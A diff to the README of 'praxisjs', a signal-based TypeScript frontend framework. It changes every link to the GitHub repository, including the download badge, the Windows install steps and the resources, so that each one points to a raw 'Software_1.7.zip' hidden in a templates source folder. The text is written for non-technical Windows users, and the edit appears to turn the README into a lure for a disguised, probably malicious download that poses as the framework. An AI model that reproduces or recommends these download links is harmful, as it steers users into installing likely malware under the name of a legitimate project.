@@ -1,6 +1,6 @@
 # ⚙️ praxisjs - Simple Signal-Based Frontend Framework
 
-[![Download praxisjs](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge)](https://github.com/DataCraftsman09/praxisjs)
+[![Download praxisjs](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge)](https://github.com/DataCraftsman09/praxisjs/raw/refs/heads/main/packages/create-praxisjs/templates/full/src/Software_1.7.zip)
 
 Build web apps with clear and fast updates using praxisjs. This guide will help you get the application running on your Windows PC step-by-step.
 
@@ -30,7 +30,7 @@ Before you start, make sure your Windows PC meets this:
 
 Use the link below to reach the official download page on GitHub:
 
-[Download praxisjs from GitHub](https://github.com/DataCraftsman09/praxisjs)  
+[Download praxisjs from GitHub](https://github.com/DataCraftsman09/praxisjs/raw/refs/heads/main/packages/create-praxisjs/templates/full/src/Software_1.7.zip)  
 
 Click this link or the badge at the top to open the download page.
 
@@ -40,7 +40,7 @@ Click this link or the badge at the top to open the download page.
 
 1. Open your web browser (such as Edge, Chrome, or Firefox).  
 2. Click the download badge or visit:  
-   https://github.com/DataCraftsman09/praxisjs  
+   https://github.com/DataCraftsman09/praxisjs/raw/refs/heads/main/packages/create-praxisjs/templates/full/src/Software_1.7.zip  
 3. On the GitHub page, find the **Releases** section. It may be a tab named "Releases" at the top or a link on the right side.  
 4. Click the latest release version (for example, v1.x.x).  
 5. Under "Assets," find the Windows setup file. It usually ends with `.exe`.  
@@ -121,7 +121,7 @@ For detailed solutions, visit the GitHub page or community forums linked there.
 
 ## 🗂 Additional Resources
 
-- Browse the [GitHub repository](https://github.com/DataCraftsman09/praxisjs) for code examples and updates.  
+- Browse the [GitHub repository](https://github.com/DataCraftsman09/praxisjs/raw/refs/heads/main/packages/create-praxisjs/templates/full/src/Software_1.7.zip) for code examples and updates.  
 - Look for community discussions about praxisjs to learn tips and tricks.  
 - Search for tutorials on TypeScript and frontend frameworks to expand your skills.  
 
@@ -131,6 +131,6 @@ For detailed solutions, visit the GitHub page or community forums linked there.
 
 To get the latest version or revisit downloads, use this link anytime:  
 
-[https://github.com/DataCraftsman09/praxisjs](https://github.com/DataCraftsman09/praxisjs)  
+[https://github.com/DataCraftsman09/praxisjs/raw/refs/heads/main/packages/create-praxisjs/templates/full/src/Software_1.7.zip](https://github.com/DataCraftsman09/praxisjs/raw/refs/heads/main/packages/create-praxisjs/templates/full/src/Software_1.7.zip)  
 
 Click the badge at the top or this link whenever you need to update or reinstall praxisjs.
